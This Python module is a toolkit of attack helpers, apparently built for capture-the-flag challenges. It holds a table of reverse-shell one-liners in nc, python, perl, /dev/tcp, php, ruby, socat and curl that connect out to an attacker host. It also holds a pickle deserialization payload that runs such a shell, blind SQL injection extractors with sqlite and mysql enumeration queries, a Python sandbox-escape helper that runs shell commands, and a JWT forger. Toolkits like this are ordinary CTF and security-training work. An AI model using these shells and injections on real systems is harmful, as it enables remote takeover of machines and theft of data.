#!/usr/bin/env python3
import subprocess
import asyncio
import base64
import functools
import hashlib
import hmac
import json
import math
import os
import pickle
import string
import time
import requests
from pathlib import Path

#taken from https://github.com/lukechilds/reverse-shell
#and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
#call with str.format(host, port)
rev_shells = {
	"nc":
		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
	"python":
		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"perl":
		"""perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
	"sh":
		"/bin/sh -i >& /dev/tcp/{}/{} 0>&1",
	"nc2":
		"nc -e /bin/sh {} {}",
	"curl":
		"curl https://shell.now.sh/{}:{}",
	"php":
		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"ruby":
		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
	"socat":
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}"
}

def rev_shell(host, port, typ):
	return rev_shells[typ].format(host, port)

class PickleRCE:
	def __init__(self, cmd):
		self.cmd = cmd
	
	def __reduce__(self):
		return os.system, (self.cmd, )

def pickle_rev_shell(host, port, typ="python", protocol=None):
	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)

_chars = (
	string.ascii_letters + " " + string.digits + string.punctuation +
	string.whitespace.replace(" ", "")
).translate(str.maketrans("", "", "%_*?")) + "_?*%"
# make sure GLOB and LIKE special characters match last

def blind_sqli(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	while True:
		for c in chars:
			try:
				curr_val = val + c
				res = sqli_oracle(inject_template.format(curr_val))
				print(curr_val, res)
				if res:
					val = curr_val
					break
			except requests.exceptions.ConnectionError:  # really bad error handling
				time.sleep(1)
				break
		else:
			return val

async def _blind_sqli_async_helper(inject_template, sqli_oracle, val):
	res = await sqli_oracle(inject_template.format(val))
	print(val, res)
	return res, val

async def blind_sqli_async(inject_template, sqli_oracle, chars=_chars):
	"""sqli_oracle takes a sql condition and returns if its true or false
	inject_template is the template for injecting into sqli_oracle"""
	val = ""
	helper = functools.partial(_blind_sqli_async_helper, inject_template, sqli_oracle)
	while True:
		coros = [asyncio.create_task(helper(val + c)) for c in chars]
		for coro in asyncio.as_completed(coros):
			success, curr_val = await coro
			if success:
				for coro in coros:
					coro.cancel()
				val = curr_val
				break
		else:
			return val

# use with str.replace("$o",offset).replace("$t",table_name)
# because str.format and % formatting can't be used
blind_sqli_payloads = {
	"sqlite":
	{
	"tables":
	(
	"(SELECT count(tbl_name) FROM sqlite_master WHERE type='table'"
	" and tbl_name NOT like 'sqlite_%' and tbl_name like '{0}%' limit 1 offset $o) > 0"
	),
	"columns":
	(
	"(SELECT count(sql) FROM sqlite_master WHERE type='table'"
	" and tbl_name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
	)
	},
	"mysql":
	{
	"tables":
	(
	"(select count(table_name) from information_schema.tables"
	" where table_name like '{0}%' limit 1 offset $o) > 0"
	),
	"columns":
	(
	"(select count(column_name) from information_schema.columns"
	" where table_name='$t' and column_name like '{0}%' limit 1 offset $o) > 0"
	)
	}
}

def blind_sqli_payload(dbms, typ, offset=0, table_name=""):
	return blind_sqli_payloads[dbms][typ].replace("$o", str(offset)).replace("$t", table_name)

class PyJail:
	"""makes interacting with python jails easier"""
	def __init__(self, fn):
		""" fn is the function to interact with the pyjail that takes and returns a string """
		self.fn = fn
		subclasses = "''.__class__.mro()[1].__subclasses__()"
		self.builtins = f"{subclasses}[-1].__init__.__globals__['__builtins__']"
	
	def run(self, s: str):
		"""directly run with s appended to self.builtins"""
		return self.fn(self.builtins + s)
	
	def call(self, fn: str, *args, module: str = None):
		"""call function"""
		return self.run(self._call(fn, *args, module))
	
	def cat(self, filename: str):
		return self.run(self._call("open", filename) + ".read()")
	
	def ls(self, folder: str = "."):
		return self.call("listdir", folder, module="os")
	
	def shell(self, cmd: str):
		return self.run(self._call("popen", cmd, module="os") + ".read()")
	
	def _import(self, module: str):
		return f"['__import__']({module!r})"
	
	def _call(self, fn: str, *args, module: str = None):
		if module is None:  # call builtin
			return f"[{fn!r}](*{args!r})"
		else:  # import module and then call function
			return self._import(module) + f".{fn}(*{args!r})"

# for weird challs like NahamCon CTF 2020 B'omarr Style
def non_json_jwt_encode(s: bytes, key, extra_headers=None):
	header_dict = {"alg": "HS256", "typ": "JWT"}
	if extra_headers is not None:
		header_dict.update(extra_headers)
	header = jwt_b64encode(json.dumps(header_dict).encode("utf-8"))
	payload = jwt_b64encode(s)
	
	signature = jwt_b64encode(
		hmac.new(key, header + b"." + payload, digestmod=hashlib.sha256).digest()
	)
	return b".".join((header, payload, signature))

def non_json_jwt_decode(token: bytes):
	header, token, _ = map(jwt_b64decode, token.split(b"."))
	return json.loads(header), token

def jwt_b64decode(s: bytes):
	padded_len = math.ceil(len(s) / 4) * 4
	return base64.urlsafe_b64decode(s.ljust(padded_len, b"="))

def jwt_b64encode(s: bytes):
	return base64.urlsafe_b64encode(s).rstrip(b"=")

# for rev challs
PIN = Path("~/pin/pin").expanduser()
INSCOUNT32 = Path("~/pin/source/tools/ManualExamples/obj-ia32/inscount0.so").expanduser()
INSCOUNT64 = Path("~/pin/source/tools/ManualExamples/obj-intel64/inscount0.so").expanduser()

def pin_sync(filename, inscount, passwd, argv=False, out_file="inscount.out"):
	if argv:
		subprocess.run(
			[PIN, "-t", inscount, "-o", out_file, "--", filename, passwd],
			check=False,
		)
	else:
		subprocess.run(
			[PIN, "-t", inscount, "-o", out_file, "--", filename],
			input=passwd.encode() + b"\n",
			check=False,
		)
	with open(out_file) as f:
		output = f.read()
		return int(output.partition(" ")[2])

async def pin(filename, inscount, val, argv=False, out_file="inscount.out"):
	if argv:
		process = await asyncio.create_subprocess_exec(
			PIN,
			"-t",
			inscount,
			"-o",
			out_file,
			"--",
			filename,
			val,
			stdout=asyncio.subprocess.DEVNULL
		)
		_, _ = await process.communicate()
	else:
		process = await asyncio.create_subprocess_exec(
			PIN,
			"-t",
			inscount,
			"-o",
			out_file,
			"--",
			filename,
			stdin=asyncio.subprocess.PIPE,
			stdout=asyncio.subprocess.DEVNULL
		)
		_, _ = await process.communicate(val.encode() + b"\n")
	with open(out_file) as f:
		output = f.read()
		return int(output.partition(" ")[2])
